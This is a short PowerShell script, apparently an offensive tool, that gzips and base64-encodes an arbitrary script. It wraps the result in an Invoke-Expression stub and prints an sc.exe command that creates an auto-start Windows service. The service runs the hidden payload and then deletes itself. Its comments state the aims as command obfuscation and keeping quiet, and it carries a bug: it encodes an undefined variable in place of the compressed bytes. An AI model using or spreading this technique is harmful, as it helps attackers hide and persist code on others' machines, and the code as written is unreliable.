# Purpose:
# Takes a path to a file containing powershell script and packages
# it for cmd.exe execution to create (using sc.exe) a bundled service
# with a loaded imagepath that executes arbitrary powershell then 
# deletes the service on service start. Purpose is command
# obfuscation.
# Note: has copyto, so needs .net 4.0 or later

# people that are serious might make this random. I am less serious here
$serviceName = 'notReally'

# taking file info in and compressing
$filePath = Read-Host 'Filepath'

$inbytes = [System.IO.File]::ReadAllBytes($filePath)
$outbytes = New-Object System.IO.MemoryStream
$zip = New-Object System.IO.Compression.GZipStream($outbytes, [System.IO.Compression.CompressionMode]::Compress)
$memstream = New-Object System.IO.MemoryStream(,$inbytes)
$memstream.CopyTo($zip)
$memstream.Close()
$zip.Close()
$compressedbytes = $outbytes.ToArray()

# taking compressed bytes and turning them into base64string
$package = [Convert]::ToBase64String($bytes)

# taking base64string and fitting it into an expression that'll pop it back open for invoke-expression
# Also packages into base64 to fit into encodedcommand, which get through parsing errors and obfuscates some more
$final = 'Invoke-Expression (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String("' + $package + '"))), [IO.Compression.CompressionMode]::Decompress)))).ReadToEnd(); sc.exe delete ' + $serviceName
$wrap = [System.Text.Encoding]::Unicode.GetBytes($final)
$done = [Convert]::ToBase64String($wrap)

# Note start=auto and error=ignore. This'll produce an error on service start that the resource didn't respond, since it's 
# not actually reaching out for anything, it's requesting that a command be sent. So this'll keep it quieter, 
# although the error *will* show up in the event log
Write-Host 'sc create ' + $serviceName + ' start=auto error=ignore binPath= "%COMSPEC% /c powershell.exe -encodedCommand ' + $done + '"'